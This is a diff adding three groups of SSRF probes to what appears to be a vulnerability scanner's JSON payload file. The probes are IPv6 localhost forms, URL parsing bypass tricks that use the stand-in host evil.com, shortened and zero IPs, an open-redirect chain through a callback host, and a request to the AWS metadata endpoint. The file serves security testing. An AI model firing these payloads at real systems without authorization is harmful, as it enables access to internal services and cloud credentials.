@@ -104,6 +104,127 @@
           "variables": {}
         }
       ]
+    },
+    "ipv6_bypass": {
+      "description": "SSRF bypass using IPv6 representations of localhost — evades blocklists checking for 127.0.0.1 in string form",
+      "tech_match": [],
+      "param_match": ["url", "uri", "path", "dest", "redirect", "site", "html", "feed", "to", "out", "callback", "domain", "rurl", "return"],
+      "probes": [
+        {
+          "payload": "http://[::ffff:127.0.0.1]/",
+          "description": "IPv4-mapped IPv6 address for localhost — bypasses simple string match on 127.0.0.1",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 100}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "http://[0:0:0:0:0:ffff:127.0.0.1]/",
+          "description": "Full-form IPv4-mapped IPv6 localhost — alternative notation evading short-form filters",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 100}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "http://[::1]/",
+          "description": "IPv6 loopback address (::1) — canonical localhost in IPv6, bypasses IPv4-only blocklists",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 100}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        }
+      ]
+    },
+    "url_bypass": {
+      "description": "SSRF filter bypass via URL parsing ambiguities — at-sign, fragment, shortened IP, zero IP, backslash tricks from HackTricks",
+      "tech_match": [],
+      "param_match": ["url", "uri", "path", "dest", "redirect", "site", "html", "feed", "to", "out", "callback", "domain", "rurl", "return"],
+      "probes": [
+        {
+          "payload": "http://127.0.0.1@evil.com/",
+          "description": "At-sign URL parsing trick — some parsers use evil.com as host while fetchers use 127.0.0.1 as auth host",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 100}
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {}
+        },
+        {
+          "payload": "http://evil.com#@127.0.0.1/",
+          "description": "Fragment bypass — some validators stop at # treating 127.0.0.1 as fragment, fetcher uses it as host",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 100}
+          ],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {}
+        },
+        {
+          "payload": "http://127.1/",
+          "description": "Shortened localhost IP — 127.1 resolves to 127.0.0.1 on most systems, bypasses full-quad filters",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 100}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "http://0/",
+          "description": "Zero IP — resolves to 0.0.0.0 which maps to localhost on many systems",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 100}
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {}
+        },
+        {
+          "payload": "http://127.0.0.1:80\\@evil.com/",
+          "description": "Backslash before @ trick — some URL parsers treat backslash as path separator, others as authority delimiter",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 100}
+          ],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {}
+        }
+      ]
+    },
+    "redirect_based": {
+      "description": "SSRF via open redirect chains — server fetches a URL that redirects to an internal resource",
+      "tech_match": [],
+      "param_match": ["url", "uri", "path", "dest", "redirect", "site", "html", "feed", "to", "out", "callback", "domain", "rurl", "return"],
+      "probes": [
+        {
+          "payload": "https://{{callback}}/redirect?url=http://169.254.169.254/",
+          "description": "SSRF via open redirect — server-side fetch follows redirect to cloud metadata endpoint; check collaborator for interaction",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 0}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "http://169.254.169.254/latest/meta-data/hostname",
+          "description": "AWS EC2 hostname metadata — short string response is high-confidence SSRF confirmation",
+          "matchers": [
+            {"type": "regex", "pattern": "ip-[0-9]+-[0-9]+-[0-9]+-[0-9]+"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 90,
+          "variables": {}
+        }
+      ]
     }
   }
 }
